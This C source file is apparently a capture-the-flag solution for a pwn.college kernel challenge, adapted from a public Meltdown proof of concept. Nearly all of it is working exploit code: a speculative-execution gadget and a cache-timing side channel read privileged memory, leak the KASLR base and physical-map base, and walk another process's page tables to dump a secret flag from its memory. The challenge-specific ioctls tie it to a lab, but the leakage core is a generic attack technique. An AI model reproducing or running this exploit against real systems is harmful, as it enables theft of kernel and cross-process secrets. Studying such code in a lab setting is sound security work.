// Original Source: https://github.com/corsix/meltdown-poc
// compile with -Os

#define _GNU_SOURCE

#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#include <x86intrin.h>
#include <immintrin.h>
#include <assert.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sched.h>
#include <fcntl.h>

uint64_t in_cache_threshold;
char* detector;
int kfd;

uint64_t kernbase;
uint64_t physbase;

__attribute__((noinline))
void speculate(const char* target, const char* detector) {
    asm volatile (
    ".intel_syntax noprefix;"
    "prefetchnta [%0];"

    "mfence;"
    "call herring;"

    // Speculatively executed (because of herring's ret being mispredicted):
    "movzx eax, byte ptr [%0];"
    "shl eax, 12;"
    "movzx eax, byte ptr [%1+rax];"

    "herring:"
        // Lots of slow dependent instructions:
        "xorps xmm0, xmm0;"
        "sqrtpd xmm0, xmm0;"
        "sqrtpd xmm0, xmm0;"
        "sqrtpd xmm0, xmm0;"
        "sqrtpd xmm0, xmm0;"
        "sqrtpd xmm0, xmm0;"

        // Using result of dependent instructions, adjust rsp to trick prediction of ret
        "movd eax, xmm0;"
        "lea rsp, [rsp+rax+8];"

        // Actually returns from speculate, but predicted as returning from herring
        "ret;"

    ".att_syntax;"
    : : "r" (target), "r" (detector) : "rax");
}

void maccess(const char *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }

//__attribute__((noinline))
int timed_read(const char *ptr) {
  uint64_t start, end, junk;
  uint32_t tsc;

  _mm_mfence();
  start = __rdtscp(&tsc);
  _mm_mfence();
  maccess(ptr);
  _mm_mfence();
  end = __rdtscp(&tsc);
  _mm_mfence();
  _mm_clflush(ptr);
  _mm_mfence();

  return (int)(end - start);
}

uint64_t baseline_timed(const char* target, int in_cache) {
  uint64_t total = 0;
  (void)timed_read(target);
  for (uint32_t i = 0; i < 16; ++i) {
    if (!in_cache) {
      _mm_clflush(target);
      _mm_mfence();
    }
    total >>= 2;
    total += timed_read(target);
  }
  return total;
}

int read_via_speculate(const char* target) {
  for (uint32_t i = 0; i < 256; i++) {
    _mm_clflush(detector + i*4096);
  }

  ioctl(kfd, 1337, target);

  uint64_t timings[256];
  for (uint32_t i = 0; i < 256; i++) {
    speculate(target, detector);
    timings[i] = timed_read(detector + i*4096);
  }

  uint32_t min_timing = -1;
  int min_idx = -1;
  for (uint32_t i = 0; i < 256; i++) {
    if (timings[i] < in_cache_threshold) {
      if (timings[i] < min_timing) {
        min_timing = timings[i];
        min_idx = i;
      }
    }
  }
  return min_idx;
}

void dump_range(const char* base, int range, int as_char) {
  for (uint32_t offs = 0; offs < range; offs++) {
    const char* target = base + offs;
    if ((((uintptr_t)target) & 15) == 0) {
      printf("%p: ", target);
    }
    int i = read_via_speculate(target);
    if (i < 0) {
      i = read_via_speculate(target);
    }
    if (i < 0) {
      printf("?? ");
    } else if (as_char) {
      printf("%c ", i);
    } else {
      printf("%02x ", i);
    }
    if ((((uintptr_t)target) & 15) == 15) {
      printf("\n");
    }
  }
  if (range % 16 != 0) {
    printf("\n");
  }
}

uint64_t read_qword(char *base) {
  uint64_t out = 0;
  char *out_arr = (char *)&out;
  for (uint32_t offs = 0; offs < 8; offs++) {
    char* target = base + offs;
    int i = read_via_speculate(target);
    while (i < 0) {
      i = read_via_speculate(target);
    }
    out_arr[offs] = (uint8_t)i;
  }
  return out;
}

void pin_cpu(int cpu) {
  cpu_set_t my_set;
  CPU_ZERO(&my_set);
  CPU_SET(cpu, &my_set);
  sched_setaffinity(0, sizeof(my_set), &my_set);
}

void leak_kaslr() {
  const char* target = (const char *)0xfffffe0000000004; // first IDT entry + 4

  kernbase = read_qword(target) - 0xc08e00;
  printf("KASLR: %#lx\n", kernbase);
}

void leak_phys() {
  const char* target = (const char *)kernbase + 0x12c11c0; // page_offset_base

  physbase = read_qword(target);
  printf("PHYS: %#lx\n", physbase);
}

uint64_t leak_pgd(uint64_t task_struct) {
  char* mm_target = (char *)task_struct + 0x3e0; // &task_struct->mm
  char* mm_addr = (char*)read_qword(mm_target);
  printf("mm: %#lx\n", mm_addr);

  char* pgd_target = (char *)mm_addr + 0x50; // &mm->pgd
  uint64_t pgd_addr = read_qword(pgd_target);
  printf("pgd: %#lx\n", pgd_addr);

  return pgd_addr;
}

// gets the PML4 page table indicies for a kernel virtual address, needed for pagewalking
int* get_virt_indicies(uint64_t addr) {
    int *res = malloc(sizeof(int)*4);
    memset(res, 0, sizeof(int)*4);

    addr = addr >> 12;
    for (int i = 0; i < 4; i++) {
        res[3-i] = (addr >> (i*9)) & 0x1ff;
    }
    printf("pgd: %d ; pud: %d ; pmd: %d ; pt: %d\n", res[0], res[1], res[2], res[3]);

    return res;
}

// walk the page tables to resolve a virtual address to it's corresponding physmap addr
uint64_t walk(uint64_t *pgd, int *indicies) {
    uint64_t pgd_entry = read_qword(pgd + indicies[0]);
    uint64_t *pud_addr = physbase + (pgd_entry & ~0xfffull & ~(1ull<<63));
    printf("pud: %#llx\n", pud_addr);

    uint64_t pud_entry = read_qword(pud_addr + indicies[1]);
    uint64_t *pmd_addr = physbase + (pud_entry & ~0xfffull & ~(1ull<<63));
    printf("pmd: %#llx\n", pmd_addr);

    uint64_t pmd_entry = read_qword(pmd_addr + indicies[2]);
    //printf("pmd_entry: %#llx, ind: %d\n", pmd_entry, indicies[2]);
    uint64_t *pt_addr = physbase + (pmd_entry & ~0xfffull & ~(1ull<<63));
    printf("pt: %#llx\n", pt_addr);

    uint64_t pt_entry = read_qword(pt_addr + indicies[3]);
    uint64_t addr = physbase + (pt_entry & ~0xfffull & ~(1ull<<63));

    return addr;
}

int main(int argc, char** argv) {
  pin_cpu(1);

  kfd = open("/proc/pwncollege", O_RDONLY);

  struct ioctl_struct {
      pid_t pid; // provide this
      uint64_t task; // receive this
  } ioctl_data;

  assert(argc == 2 && "missing required arg: pid");

  ioctl_data.pid = atol(argv[1]);
  printf("pid: %d\n", ioctl_data.pid);

  ioctl(kfd, 31337, &ioctl_data);
  printf("task: %#lx\n", ioctl_data.task);

  detector = mmap(0, 4096 * 256, PROT_READ | PROT_WRITE, MAP_PRIVATE|MAP_ANON|MAP_POPULATE, 0, 0);

  //in_cache_threshold = (baseline_timed(detector, 1) * 3 + baseline_timed(detector, 0)) >> 2;
  in_cache_threshold = 0x200; // has worked better in practice than ^^^^^

  printf("threshold: %lx\n", in_cache_threshold);

  leak_kaslr();
  leak_phys();

  uint64_t task_struct = ioctl_data.task;
  uint64_t pgd = leak_pgd(task_struct);

  char *target = 0x404060; // addr of flag in the other process (fixed, no-pie)

  int *indicies = get_virt_indicies(target);
  int pgoff = (uint64_t)target & 0xfff; // offset within page

  char *kern_target = walk(pgd, indicies) + pgoff; // get kernel addr of flag
  printf("flag at: %#lx\n", kern_target);

  dump_range(kern_target, 21, 1);
}
